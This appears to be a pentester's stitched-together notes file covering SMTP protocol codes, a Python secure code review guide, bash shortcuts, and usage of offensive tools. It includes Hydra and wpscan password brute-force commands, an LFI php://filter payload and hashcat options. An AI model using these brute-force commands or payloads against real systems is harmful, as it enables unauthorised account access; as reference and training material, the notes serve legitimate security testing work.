+-- Sends a message to a user's terminal if they are logged on; otherwise, sends the message to the user's mailbox.
+TURN
+-- Reverses the role of client and server. This might be useful if the client program can also act as a server and needs to receive mail from the remote computer.
+VRFY
+-- Verifies the existence and user name of a given mail address. This command is not implemented in all mail servers. And it can be blocked by firewalls.
+Every command will receive a reply from the mail server in the form of a three digit number followed by some text describing the reply. For example,
+
+250 OK
+
+or
+
+500 Syntax error, command unrecognized.
+
+The complete list of reply codes is shown below: (you'll never see most of them if you program your mail server correctly!!)
+
+211
+-- A system status or help reply.
+214
+-- Help Message.
+220
+-- The server is ready.
+221
+-- The server is ending the conversation.
+250
+-- The requested action was completed.
+251
+-- The specified user is not local, but the server will forward the mail message.
+354
+-- This is a reply to the DATA command. After getting this, start sending the body of the mail message, ending with "\r\n.\r\n."
+421
+-- The mail server will be shut down. Save the mail message and try again later.
+450
+-- The mailbox that you are trying to reach is busy. Wait a little while and try again.
+451
+-- The requested action was not done. Some error occurmiles in the mail server.
+452
+-- The requested action was not done. The mail server ran out of system storage.
+500
+-- The last command contained a syntax error or the command line was too long.
+501
+-- The parameters or arguments in the last command contained a syntax error.
+502
+-- The mail server has not implemented the last command.
+503
+-- The last command was sent out of sequence. For example, you might have sent DATA before sending RECV.
+504
+-- One of the parameters of the last command has not been implemented by the server.
+550
+-- The mailbox that you are trying to reach can't be found or you don't have access rights.
+551
+-- The specified user is not local; part of the text of the message will contain a forwarding address.
+552
+-- The mailbox that you are trying to reach has run out of space. Store the message and try again tomorrow or in a few days-after the user gets a chance to delete some messages.
+553
+-- The mail address that you specified was not syntactically correct.
+554
+-- The mail transaction has failed for unknown causes.
+Now that you've seen all of the SMTP commands and reply codes, let's see what a typical mail conversation might look like. In the following conversation, the '>' lines are the SMTP commands that your program issues. The '<' lines are the mail server's replies.
+
+>HELO
+<250 sentinel.cs.cf.ac.uk Hello dave@cs.cf.ac.uk [X.X.X.X],pleased to meet you
+
+
+>MAIL From: <(Ralph Martin)>
+<250 <(Ralph Martin)>... Sender ok
+
+
+>RCPT To: <dave@cs.cf.ac.uk>
+<250 <dave@cs.cf.ac.uk>... Recipient ok
+
+
+>DATA
+<354 Enter mail, end with "." on a line by itself
+
+
+>From: (Ralph Martin)
+>Subject: Arrows
+>This is line one.
+>This is line two.
+>.
+<250 AAA14672 Message accepted for delivery
+
+
+>QUIT
+<221 sentinel.cs.cf.ac.uk closing connection
+
+
+###############################################################################
+{Python}{code review}
+###############################################################################
+
+Code Review For Python-Based Web Apps
+Views: 1685
+
+WRITTEN BY: STEPHEN HAYWOOD JULY 18, 2016
+Recently one of our testers asked if there were any static analysis tools for Python code. He was reviewing a web app written in Python and was trying to identify any high-risk issues. I wasn’t aware of any readily available, security focused static analysis tools for Python because most available tools focus on syntax compliance not security and the few security-focused tools, like Fortify, can be very costly. However, I was able to give him a list of high-risk issues that could be easily identified with a manual review. This list allowed him to check for a number of the high-risk issues on our standard web application checklist.
+
+SQL Injection
+
+Look for any files that contain SQL queries. You want to find queries that are using syntax similar to the following:
+
+     stmt = "SELECT * FROM table WHERE id=?" connection.execute(stmt, (value,))
+
+This means the app is using parameterized queries. You don’t want to find queries that look like either of the following:
+
+
+     "SELECT * FROM table WHERE id=" + value
+
+     "SELECT * FROM table WHERE id=%s" % value
+
+     "SELECT * FROM table WHERE id={0}".format(value) 
+Without some other sanitization in place these will lead to SQL injection. It is better to use the parameterized form.
+
+Command Injection
+
+Look for any files that import the os module. Check these files carefully to ensure that no unsanitized user input is passed to the os.popen*, os.spawn*, os.fork, os.system, or os.exec* methods. Also look for any calls to the popen2 module and the commands module. Keep in mind, with the exception of the os.exec* and os.spawn* methods all of these methods and modules have been deprecated as of Python 2.6 in favor of the subprocess module. Any applications still using these methods or modules should be modified to use the subprocess module instead. While not deprecated, it is recommended to use subprocess instead of the os.spawn* methods.
+
+Look for any files importing the subprocess module and ensure no unsanitized user input is being passed to any of the methods. By default all of the subprocess methods set the shell parameter to False, which prevents shell special characters from being interpreted. This will prevent typical command injection attacks. If the shell parameter needs to be set to True then use the pipes.quote() function or the shlex.quote() function depending on your version of Python to sanitize the user input first.
+
+You don’t want to find calls like this:
+
+     subprocess.call("cat " + user_input, shell=True)
+
+     subprocess.call("cat %s" % user_input, shell=True)
+
+     subprocess.call("cat {0}".format(user_input), shell=True)
+If shell=True is needed then use a call like this:
+
+     subprocess.call("cat " + pipes.quote(user_input), shell=True)
+
+     subprocess.call("cat %s" % pipes.quote(user_input), shell=True)
+
+     subprocess.call("cat {0}".format(pipes.quote(user_input)), shell=True)
+If shell=True is not needed then these calls will be sufficient, but I would still recommend doing a sanity check on the user input:
+
+     subprocess.call("cat " + user_input)
+
+     subprocess.call("cat %s" % user_input)
+
+     subprocess.call("cat {0}".format(user_input))
+Directory Traversal
+
+Look for any files with the open() statement or the os.fdopen() method to ensure unsanitized user input is not passed to these methods.
+
+You want to avoid calls such as:
+
+     open(user_input)
+
+     os.fdopen(user_input)
+Before opening a file, check the user’s input and determine if the file is safe to open. Here is an excellent example taken from https://security.openstack.org/guidelines/dg_using-file-paths.html:
+
+    cwd = os.getcwd()
+
+     if os.path.abspath(user_input).startswith(cwd) is True:
+
+         open(user_input)
+This will get the absolute path of the users input and ensure it starts with current working directory, like the following:
+
+     >>> os.getcwd()
+
+     '/Users/tester'
+
+     >>> os.path.abspath('../../../etc/passwd')
+
+     '/etc/passwd'
+
+     >>> os.path.abspath('../../../etc/passwd').startswith(os.getcwd())
+
+     False
+
+     >>> 
+Depending on how the Python code is structured it may not make sense to use the current working directory. Any directory path can be used.
+
+Cross-Site Scripting
+
+This application was not using a templating language so it was necessary to look for files using the cgi module and ensure all user supplied input was written back to the browser using cgi.escape(). The cgi.escape() method will replace <, >, and & with their HTML equivalents. The first argument to cgi.escape() is the string to perform the escape on. The second argument defaults to False and tells the method whether double quotes should be escaped as well. If the user input will be used inside an attribute then double quotes should be escaped as well.
+
+CGI scripts use simple print statements to create the page returned to the web browser by the web server. Calls like the following should be avoided:
+
+     print(user_input)
+Instead use the following:
+
+
+     print(cgi.escape(user_input))
+The difference can be clearly seen in the following example:
+
+     >>> user_input = '<script>alert(1)</script>'
+
+     >>> print(user_input)
+
+     <script>alert(1)</script>
+
+
+     >>> print(cgi.escape(user_input))
+
+     &lt;script&gt;alert(1)&lt;/script&gt;
+>The next example shows the reason for escaping double quotes. In the first print statement notice that the user input adds a new attribute and in the second the escaped quotes prevent the user input from inserting a new attribute.
+
+     >>> user_input = '" onload="alert(1)'
+
+     >>> print('<img src="{0}"'.format(user_input))
+
+     <img src="" onload="alert(1)"
+
+
+     >>> print('<img src="{0}"'.format(cgi.escape(user_input, True)))
+
+     <img src="&quot; onload=&quot;alert(1)"
+Exception Handling
+
+Review the application to ensure appropriate exception handling and logging are taking place. Specifically, look for try/except clauses and ensure the exceptions caught are logged and dealt with appropriately. A common pattern in Python is to use a try/except clause like the following:
+
+     try:
+
+         execute_some_code()
+
+     except:
+
+         pass
+This pattern catches all exception and simply ignores them instead of logging and handling them. A more appropriate pattern would look like this:
+
+     try:
+
+         execute_some_code()
+
+         execute_some_other_code()
+
+
+     except SomeException as e:
+
+         logging.error(e)
+
+         cleanup1()
+
+
+     except SomeOtherException as e:
+
+         logging.error(e)
+
+         cleanup2()
+
+
+     except Exception as e:
+
+         logging.error(e)
+
+         cleanup3()
+
+
+###############################################################################
+{samples}
+###############################################################################
+
+1. Get list of unique IP from this:
+
+–First Floor–
+Computers: 192.168.1.0/24
+WiFi APs: 192.168.2.0/24
+Printers: 192.168.2.0/24
+–Second Floor–
+Computers: 192.168.3.0/24
+WiFi APs: 192.168.4.0/24
+Printers: 192.168.4.0/24
+–Server Room–
+Windows Servers: 192.168.100.0/24
+Switches and Wireless LAN Controllers: 192.168.101.0/24
+
+solution (oneliner):
+
+$ grep -e [0-9] iplist | cut -d':' -f 2 | sort -u | sed 's/ //'
+
+result:
+192.168.1.0/24
+192.168.100.0/24
+192.168.101.0/24
+192.168.2.0/24
+192.168.3.0/24
+192.168.4.0/24
+
+
+
+
+###############################################################################
+{Bash}{shortcuts}
+###############################################################################
+
+Bash Keyboard Shortcuts
+
+Moving the cursor:
+  Ctrl + a   Go to the beginning of the line (Home)
+  Ctrl + e   Go to the End of the line (End)
+  Ctrl + p   Previous command (Up arrow)
+  Ctrl + n   Next command (Down arrow)
+   Alt + b   Back (left) one word
+   Alt + f   Forward (right) one word
+  Ctrl + f   Forward one character
+  Ctrl + b   Backward one character
+  Ctrl + xx  Toggle between the start of line and current cursor position
+Editing:
+ Ctrl + L   Clear the Screen, similar to the clear command
+
+  Alt + Del Delete the Word before the cursor.
+  Alt + d   Delete the Word after the cursor.
+ Ctrl + d   Delete character under the cursor
+ Ctrl + h   Delete character before the cursor (Backspace)
+
+ Ctrl + w   Cut the Word before the cursor to the clipboard.
+ Ctrl + k   Cut the Line after the cursor to the clipboard.
+ Ctrl + u   Cut/delete the Line before the cursor to the clipboard.
+
+  Alt + t   Swap current word with previous
+ Ctrl + t   Swap the last two characters before the cursor (typo).
+ Esc  + t   Swap the last two words before the cursor.
+
+ ctrl + y   Paste the last thing to be cut (yank)
+  Alt + u   UPPER capitalize every character from the cursor to the end of the current word.
+  Alt + l   Lower the case of every character from the cursor to the end of the current word.
+  Alt + c   Capitalize the character under the cursor and move to the end of the word.
+  Alt + r   Cancel the changes and put back the line as it was in the history (revert).
+ ctrl + _   Undo
+ 
+ TAB        Tab completion for file/directory names
+For example, to move to a directory 'sample1'; Type cd sam ; then press TAB and ENTER. 
+type just enough characters to uniquely identify the directory you wish to open.
+
+Special keys: Tab, Backspace, Enter, Esc
+Text Terminals send characters (bytes), not key strokes. 
+Special keys such as Tab, Backspace, Enter and Esc are encoded as control characters. 
+Control characters are not printable, they display in the terminal as ^ and are intended to have an effect on applications.
+
+Ctrl+I = Tab
+Ctrl+J = Newline
+Ctrl+M = Enter
+Ctrl+[ = Escape
+
+Many terminals will also send control characters for keys in the digit row: 
+Ctrl+2 → ^@
+Ctrl+3 → ^[ Escape
+Ctrl+4 → ^\
+Ctrl+5 → ^]
+Ctrl+6 → ^^
+Ctrl+7 → ^_ Undo
+Ctrl+8 → ^? Backward-delete-char
+
+Ctrl+v tells the terminal to not interpret the following character, so Ctrl+v Ctrl-I will display a tab character, 
+similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
+
+History:
+  Ctrl + r   Recall the last command including the specified character(s)
+             searches the command history as you type.
+             Equivalent to : vim ~/.bash_history. 
+  Ctrl + p   Previous command in history (i.e. walk back through the command history)
+  Ctrl + n   Next command in history (i.e. walk forward through the command history)
+
+  Ctrl + s   Go back to the next most recent command.
+             (beware to not execute it from a terminal because this will also launch its XOFF).
+  Ctrl + o   Execute the command found via Ctrl+r or Ctrl+s
+  Ctrl + g   Escape from history searching mode
+        !!   Repeat last command
+      !abc   Run last command starting with abc
+    !abc:p   Print last command starting with abc
+        !$   Last argument of previous command
+   ALT + .   Last argument of previous command
+        !*   All arguments of previous command
+^abc­^­def   Run previous command, replacing abc with def
+Process control:
+ Ctrl + C   Interrupt/Kill whatever you are running (SIGINT)
+ Ctrl + l   Clear the screen
+ Ctrl + s   Stop output to the screen (for long running verbose commands)
+            Then use PgUp/PgDn for navigation
+ Ctrl + q   Allow output to the screen (if previously stopped using command above)
+ Ctrl + D   Send an EOF marker, unless disabled by an option, this will close the current shell (EXIT)
+ Ctrl + Z   Send the signal SIGTSTP to the current task, which suspends it.
+            To return to it later enter fg 'process name' (foreground).
+
+
+            
+###############################################################################
+{LFI}
+###############################################################################
+
+php://filter/convert.base64-encode/resource=
+
+
+
+###############################################################################
+{Chrome}{V8}{Blink}
+###############################################################################
+
+document.body.contentEditable=true 
+getEventListeners($(‘selector’))
+$(‘tagName’) $(‘.class’) $(‘#id’) and $(‘.class #id’) are equivalent to the document.querySelector(‘ ‘)
+$$(‘tagName’) or $$(‘.class’)  to select all the elements of the DOM
+
+monitorEvents($(‘selector’))
+monitorEvents($(‘selector’),’eventName’) 
+monitorEvents($(‘selector’),[‘eventName1’,’eventName3',….])
+unmonitorEvents($(‘selector’)) 
+inspect($(‘selector’)) 
+dir($(‘selector’))
+
+###############################################################################
+{Hydra}
+###############################################################################
+
+Brute Force Attack
+If hackers decide to make pure brute force then they need to exclude the option '-P' and use '-x min:max:char', for example '-x 3:3:a' :
+
+
+root@find:~/Desktop# hydra -t 10 -V -f -l root -x 4:6:a ftp://192.168.67.132
+
+
+The hydra syntax:
+-t = How many parallel attempt at a time(1/5/10/100 ?). Don't use too much otherwise you will get false result
+-V = Show output
+-f = Stop when found the password.
+-l = The Username (-L for username from file)
+-P= Dictionary file
+IP-address-or-domain module-such-as-http-form
+
+FTP:
+root@find:~/Desktop# hydra -t 5 -V -f -l root -P common.txt ftp://192.168.67.132
+
+SSH:
+root@find:~/Desktop# hydra -t 5 -V -f -l root -P common.txt localhost ssh
+
+MySQL:
+root@find:~/Desktop# hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
+
+HTTP (Form):
+
+URL: http://http://localhost/login/ (Optional?)
+Action page: http://localhost/login/log.php   (Required)
+User: admin
+Form parameter:  user=admin&password=brute-force-here   (see the html!)
+
+Let us now brute force the password using thc-hydra.
+
+Hydra command 1:
+
+hydra -t 4 -l admin -V -P common.txt 192.168.206.1 http-form-post "/login/log.php:user=^USER^&password=^PASS^:S=success"
+
+Let's break down the "/login/log.php:user=^USER^&password=^PASS^:S=success" 
+ 
+/login/ = path
+log.php = Action page 
+user = First parameter
+^USER^ = Use the strings from -l or -L
+password = Second parameter
+^PASS^ =  Use the strings from -p or -P(usually dictionary file or for brute force option -x)
+S=success = When hydra see success message from the action page it will stop mean , Successfully cracked!
+This is really important. If it has been set wrong then hydra will give false positive. So careful! 
+ 
+ 
+
+
+###############################################################################
+{wpscan}
+###############################################################################
+
+ruby ./wpscan.rb --help
+
+-Do 'non-intrusive' checks ...
+ruby ./wpscan.rb --url www.example.com
+
+-Do wordlist password brute force on enumerated users using 50 threads ...
+ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --threads 50
+
+-Do wordlist password brute force on the 'admin' username only ...
+ruby ./wpscan.rb --url www.example.com --wordlist darkc0de.lst --username admin
+
+-Enumerate installed plugins ...
+ruby ./wpscan.rb --url www.example.com --enumerate p
+
+-Enumerate installed themes ...
+ruby ./wpscan.rb --url www.example.com --enumerate t
+
+-Enumerate users ...
+ruby ./wpscan.rb --url www.example.com --enumerate u
+
+-Enumerate installed timthumbs ...
+ruby ./wpscan.rb --url www.example.com --enumerate tt
+
+-Use a HTTP proxy ...
+ruby ./wpscan.rb --url www.example.com --proxy 127.0.0.1:8118
+
+-Use a SOCKS5 proxy ... (cURL >= v7.21.7 needed)
+ruby ./wpscan.rb --url www.example.com --proxy socks5://127.0.0.1:9000
+
+-Use custom content directory ...
+ruby ./wpscan.rb -u www.example.com --wp-content-dir custom-content
+
+-Use custom plugins directory ...
+ruby ./wpscan.rb -u www.example.com --wp-plugins-dir wp-content/custom-plugins
+
+-Update the DB ...
+ruby ./wpscan.rb --update
+
+-Debug output ...
+ruby ./wpscan.rb --url www.example.com --debug-output 2>debug.log
+
+
+###############################################################################
+{Hashcat}
+###############################################################################
+
+hashcat, advanced password recovery
+
+Usage: hashcat [options]... hash|hashfile|hccapfile [dictionary|mask|directory]...
+
+- [ Options ] -
+
+ Options Short / Long          | Type | Description                                          | Example
+===============================+======+======================================================+=======================
+ -m, --hash-type               | Num  | Hash-type, see references below                      | -m 1000
+ -a, --attack-mode             | Num  | Attack-mode, see references below                    | -a 3
+ -V, --version                 |      | Print version                                        |
+ -h, --help                    |      | Print help                                           |
+     --quiet                   |      | Suppress output                                      |
+     --hex-charset             |      | Assume charset is given in hex                       |
+     --hex-salt                |      | Assume salt is given in hex                          |
+     --hex-wordlist            |      | Assume words in wordlist is given in hex             |
+     --force                   |      | Ignore warnings                                      |
+     --status                  |      | Enable automatic update of the status-screen         |
+     --status-timer            | Num  | Sets seconds between status-screen update to X       | --status-timer=1
+     --machine-readable        |      | Display the status view in a machine readable format |
+     --loopback                |      | Add new plains to induct directory                   |
+     --weak-hash-threshold     | Num  | Threshold X when to stop checking for weak hashes    | --weak=0
+     --markov-hcstat           | File | Specify hcstat file to use                           | --markov-hc=my.hcstat
+     --markov-disable          |      | Disables markov-chains, emulates classic brute-force |
+     --markov-classic          |      | Enables classic markov-chains, no per-position       |
+ -t, --markov-threshold        | Num  | Threshold X when to stop accepting new markov-chains | -t 50
+     --runtime                 | Num  | Abort session after X seconds of runtime             | --runtime=10
+     --session                 | Str  | Define specific session name                         | --session=mysession
+     --restore                 |      | Restore session from --session                       |
+     --restore-disable         |      | Do not write restore file                            |
+ -o, --outfile                 | File | Define outfile for recovered hash                    | -o outfile.txt
+     --outfile-format          | Num  | Define outfile-format X for recovered hash           | --outfile-format=7
+     --outfile-autohex-disable |      | Disable the use of $HEX[] in output plains           |
+     --outfile-check-timer     | Num  | Sets seconds between outfile checks to X             | --outfile-check=30
+ -p, --separator               | Char | Separator char for hashlists and outfile             | -p :
+     --stdout                  |      | Do not crack a hash, instead print candidates only   |
+     --show                    |      | Compare hashlist with potfile; Show cracked hashes   |
+     --left                    |      | Compare hashlist with potfile; Show uncracked hashes |
+     --username                |      | Enable ignoring of usernames in hashfile             |
+     --remove                  |      | Enable remove of hash once it is cracked             |
+     --remove-timer            | Num  | Update input hash file each X seconds                | --remove-timer=30
+     --potfile-disable         |      | Do not write potfile                                 |
+     --potfile-path            | Dir  | Specific path to potfile                             | --potfile-path=my.pot
+     --debug-mode              | Num  | Defines the debug mode (hybrid only by using rules)  | --debug-mode=4
+     --debug-file              | File | Output file for debugging rules                      | --debug-file=good.log
+     --induction-dir           | Dir  | Specify the induction directory to use for loopback  | --induction=inducts
+     --outfile-check-dir       | Dir  | Specify the outfile directory to monitor for plains  | --outfile-check-dir=x
+     --logfile-disable         |      | Disable the logfile                                  |
+     --truecrypt-keyfiles      | File | Keyfiles used, separate with comma                   | --truecrypt-key=x.png
+     --veracrypt-keyfiles      | File | Keyfiles used, separate with comma                   | --veracrypt-key=x.txt
+     --veracrypt-pim           | Num  | VeraCrypt personal iterations multiplier             | --veracrypt-pim=1000
+ -b, --benchmark               |      | Run benchmark                                        |
+ -c, --segment-size            | Num  | Sets size in MB to cache from the wordfile to X      | -c 32
+     --bitmap-min              | Num  | Sets minimum bits allowed for bitmaps to X           | --bitmap-min=24
+     --bitmap-max              | Num  | Sets maximum bits allowed for bitmaps to X           | --bitmap-min=24
+     --cpu-affinity            | Str  | Locks to CPU devices, separate with comma            | --cpu-affinity=1,2,3
+     --opencl-platforms        | Str  | OpenCL platforms to use, separate with comma         | --opencl-platforms=2
+ -d, --opencl-devices          | Str  | OpenCL devices to use, separate with comma           | -d 1
+ -D, --opencl-device-types     | Str  | OpenCL device-types to use, separate with comma      | -D 1
+     --opencl-vector-width     | Num  | Manual override OpenCL vector-width to X             | --opencl-vector=4
+ -w, --workload-profile        | Num  | Enable a specific workload profile, see pool below   | -w 3
+ -n, --kernel-accel            | Num  | Manual workload tuning, set outerloop step size to X | -n 64
+ -u, --kernel-loops            | Num  | Manual workload tuning, set innerloop step size to X | -u 256
+     --nvidia-spin-damp        | Num  | Workaround NVidias CPU burning loop bug, in percent  | --nvidia-spin-damp=50
+     --gpu-temp-disable        |      | Disable temperature and fanspeed reads and triggers  |
+     --gpu-temp-abort          | Num  | Abort if GPU temperature reaches X degrees celsius   | --gpu-temp-abort=100
+     --gpu-temp-retain         | Num  | Try to retain GPU temperature at X degrees celsius   | --gpu-temp-retain=95
+     --powertune-enable        |      | Enable power tuning, restores settings when finished |
+     --scrypt-tmto             | Num  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3
+ -s, --skip                    | Num  | Skip X words from the start                          | -s 1000000
+ -l, --limit                   | Num  | Limit X words from the start + skipped words         | -l 1000000
+     --keyspace                |      | Show keyspace base:mod values and quit               |
+ -j, --rule-left               | Rule | Single rule applied to each word from left wordlist  | -j 'c'
+ -k, --rule-right              | Rule | Single rule applied to each word from right wordlist | -k '^-'
+ -r, --rules-file              | File | Multiple rules applied to each word from wordlists   | -r rules/best64.rule
+ -g, --generate-rules          | Num  | Generate X random rules                              | -g 10000
+     --generate-rules-func-min | Num  | Force min X funcs per rule                           |
+     --generate-rules-func-max | Num  | Force max X funcs per rule                           |
+     --generate-rules-seed     | Num  | Force RNG seed set to X                              |
+ -1, --custom-charset1         | CS   | User-defined charset ?1                              | -1 ?l?d?u
+ -2, --custom-charset2         | CS   | User-defined charset ?2                              | -2 ?l?d?s
+ -3, --custom-charset3         | CS   | User-defined charset ?3                              |
+ -4, --custom-charset4         | CS   | User-defined charset ?4                              |
+ -i, --increment               |      | Enable mask increment mode                           |
+     --increment-min           | Num  | Start mask incrementing at X                         | --increment-min=4
+     --increment-max           | Num  | Stop mask incrementing at X                          | --increment-max=8
+
+- [ Hash modes ] -
+
+      # | Name                                             | Category
+  ======+==================================================+======================================
+    900 | MD4                                              | Raw Hash
+      0 | MD5                                              | Raw Hash
+   5100 | Half MD5                                         | Raw Hash
+    100 | SHA1                                             | Raw Hash
+  10800 | SHA-384                                          | Raw Hash
+   1400 | SHA-256                                          | Raw Hash
+   1700 | SHA-512                                          | Raw Hash
+   5000 | SHA-3(Keccak)                                    | Raw Hash
+  10100 | SipHash                                          | Raw Hash
+   6000 | RipeMD160                                        | Raw Hash
+   6100 | Whirlpool                                        | Raw Hash
+   6900 | GOST R 34.11-94                                  | Raw Hash
+  11700 | GOST R 34.11-2012 (Streebog) 256-bit             | Raw Hash
+  11800 | GOST R 34.11-2012 (Streebog) 512-bit             | Raw Hash
+     10 | md5($pass.$salt)                                 | Raw Hash, Salted and / or Iterated
+     20 | md5($salt.$pass)                                 | Raw Hash, Salted and / or Iterated
+     30 | md5(unicode($pass).$salt)                        | Raw Hash, Salted and / or Iterated
+     40 | md5($salt.unicode($pass))                        | Raw Hash, Salted and / or Iterated
+   3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and / or Iterated
+   3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and / or Iterated
+   2600 | md5(md5($pass))                                  | Raw Hash, Salted and / or Iterated
+   4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and / or Iterated
+   4400 | md5(sha1($pass))                                 | Raw Hash, Salted and / or Iterated
+    110 | sha1($pass.$salt)                                | Raw Hash, Salted and / or Iterated
+    120 | sha1($salt.$pass)                                | Raw Hash, Salted and / or Iterated
+    130 | sha1(unicode($pass).$salt)                       | Raw Hash, Salted and / or Iterated
+    140 | sha1($salt.unicode($pass))                       | Raw Hash, Salted and / or Iterated
+   4500 | sha1(sha1($pass))                                | Raw Hash, Salted and / or Iterated
+   4700 | sha1(md5($pass))                                 | Raw Hash, Salted and / or Iterated
+   4900 | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and / or Iterated
+   1410 | sha256($pass.$salt)                              | Raw Hash, Salted and / or Iterated
+   1420 | sha256($salt.$pass)                              | Raw Hash, Salted and / or Iterated
+   1430 | sha256(unicode($pass).$salt)                     | Raw Hash, Salted and / or Iterated
+   1440 | sha256($salt.unicode($pass))                     | Raw Hash, Salted and / or Iterated
+   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and / or Iterated
+   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and / or Iterated
+   1730 | sha512(unicode($pass).$salt)                     | Raw Hash, Salted and / or Iterated
+   1740 | sha512($salt.unicode($pass))                     | Raw Hash, Salted and / or Iterated
+     50 | HMAC-MD5 (key = $pass)                           | Raw Hash, Authenticated
+     60 | HMAC-MD5 (key = $salt)                           | Raw Hash, Authenticated
+    150 | HMAC-SHA1 (key = $pass)                          | Raw Hash, Authenticated
+    160 | HMAC-SHA1 (key = $salt)                          | Raw Hash, Authenticated
+   1450 | HMAC-SHA256 (key = $pass)                        | Raw Hash, Authenticated
+   1460 | HMAC-SHA256 (key = $salt)                        | Raw Hash, Authenticated
+   1750 | HMAC-SHA512 (key = $pass)                        | Raw Hash, Authenticated
+   1760 | HMAC-SHA512 (key = $salt)                        | Raw Hash, Authenticated
+    400 | phpass                                           | Generic KDF
+   8900 | scrypt                                           | Generic KDF
+  11900 | PBKDF2-HMAC-MD5                                  | Generic KDF
+  12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF
+  10900 | PBKDF2-HMAC-SHA256                               | Generic KDF
+  12100 | PBKDF2-HMAC-SHA512                               | Generic KDF
+     23 | Skype                                            | Network protocols
+   2500 | WPA/WPA2                                         | Network protocols
+   4800 | iSCSI CHAP authentication, MD5(Chap)             | Network protocols
+   5300 | IKE-PSK MD5                                      | Network protocols
+   5400 | IKE-PSK SHA1                                     | Network protocols
+   5500 | NetNTLMv1                                        | Network protocols
+   5500 | NetNTLMv1 + ESS                                  | Network protocols
+   5600 | NetNTLMv2                                        | Network protocols
+   7300 | IPMI2 RAKP HMAC-SHA1                             | Network protocols
+   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network protocols
+   8300 | DNSSEC (NSEC3)                                   | Network protocols
+  10200 | Cram MD5                                         | Network protocols
+  11100 | PostgreSQL CRAM (MD5)                            | Network protocols
+  11200 | MySQL CRAM (SHA1)                                | Network protocols
+  11400 | SIP digest authentication (MD5)                  | Network protocols
+  13100 | Kerberos 5 TGS-REP etype 23                      | Network protocols
+    121 | SMF (Simple Machines Forum)                      | Forums, CMS, E-Commerce, Frameworks
+    400 | phpBB3                                           | Forums, CMS, E-Commerce, Frameworks
+   2611 | vBulletin < v3.8.5                               | Forums, CMS, E-Commerce, Frameworks
+   2711 | vBulletin > v3.8.5                               | Forums, CMS, E-Commerce, Frameworks
+   2811 | MyBB                                             | Forums, CMS, E-Commerce, Frameworks
+   2811 | IPB (Invison Power Board)                        | Forums, CMS, E-Commerce, Frameworks
+   8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks
+     11 | Joomla < 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks
+    400 | Joomla > 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks
+    400 | Wordpress                                        | Forums, CMS, E-Commerce, Frameworks
+   2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks
+   7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks
+     21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks
+     21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks
+  11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks
+    124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks
+  10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks
+   3711 | Mediawiki B type                                 | Forums, CMS, E-Commerce, Frameworks
+   7600 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks
+  13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks
+     12 | PostgreSQL                                       | Database Server
+    131 | MSSQL(2000)                                      | Database Server
+    132 | MSSQL(2005)                                      | Database Server
+   1731 | MSSQL(2012)                                      | Database Server
+   1731 | MSSQL(2014)                                      | Database Server
+    200 | MySQL323                                         | Database Server
+    300 | MySQL4.1/MySQL5                                  | Database Server
+   3100 | Oracle H: Type (Oracle 7+)                       | Database Server
+    112 | Oracle S: Type (Oracle 11+)                      | Database Server
+  12300 | Oracle T: Type (Oracle 12+)                      | Database Server
+   8000 | Sybase ASE                                       | Database Server
+    141 | EPiServer 6.x < v4                               | HTTP, SMTP, LDAP Server
+   1441 | EPiServer 6.x > v4                               | HTTP, SMTP, LDAP Server
+   1600 | Apache $apr1$                                    | HTTP, SMTP, LDAP Server
+  12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server
+   1421 | hMailServer                                      | HTTP, SMTP, LDAP Server
+    101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server
+    111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server
+   1711 | SSHA-512(Base64), LDAP {SSHA512}                 | HTTP, SMTP, LDAP Server
+  11500 | CRC32                                            | Checksums
+   3000 | LM                                               | Operating-Systems
+   1000 | NTLM                                             | Operating-Systems
+   1100 | Domain Cached Credentials (DCC), MS Cache        | Operating-Systems
+   2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating-Systems
+  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                  | Operating-Systems
+   1500 | descrypt, DES(Unix), Traditional DES             | Operating-Systems
+  12400 | BSDiCrypt, Extended DES                          | Operating-Systems
+    500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
+   3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
+   7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
+   1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
+    122 | OSX v10.4, OSX v10.5, OSX v10.6                  | Operating-Systems
+   1722 | OSX v10.7                                        | Operating-Systems
+   7100 | OSX v10.8, OSX v10.9, OSX v10.10                 | Operating-Systems
+   6300 | AIX {smd5}                                       | Operating-Systems
+   6700 | AIX {ssha1}                                      | Operating-Systems
+   6400 | AIX {ssha256}                                    | Operating-Systems
+   6500 | AIX {ssha512}                                    | Operating-Systems
+   2400 | Cisco-PIX                                        | Operating-Systems
+   2410 | Cisco-ASA                                        | Operating-Systems
+    500 | Cisco-IOS $1$                                    | Operating-Systems
+   5700 | Cisco-IOS $4$                                    | Operating-Systems
+   9200 | Cisco-IOS $8$                                    | Operating-Systems
+   9300 | Cisco-IOS $9$                                    | Operating-Systems
